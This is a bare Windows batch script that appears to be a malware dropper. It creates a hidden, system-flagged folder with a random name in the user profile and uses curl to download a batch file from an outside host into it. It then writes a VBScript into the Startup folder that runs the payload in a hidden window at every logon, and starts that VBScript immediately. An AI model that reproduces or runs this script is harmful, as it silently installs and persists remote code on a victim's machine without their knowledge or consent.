@echo off
set rrrrr=%random%%random%%random%%random%%random%
cd %USERPROFILE%
if exist "%cd%\%rrrrr%\" (
	del -r "%cd%\%rrrrr%"
	mkdir "%cd%\%rrrrr%"
	attrib +s +h "%cd%\%rrrrr%"
) else (
	mkdir "%cd%\%rrrrr%"
	attrib +s +h "%cd%\%rrrrr%"
)
cd %rrrrr%
curl -o "%rrrrr%.bat" https://tdsusb2.colbster937.dev/Colbster937/run.bat
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo Set objShell = WScript.CreateObject("WScript.Shell") > "%rrrrr%.vbs"
echo objShell.Run "%USERPROFILE%\%rrrrr%\%rrrrr%.bat", 0, True >> "%rrrrr%.vbs"
start %rrrrr%.vbs
exit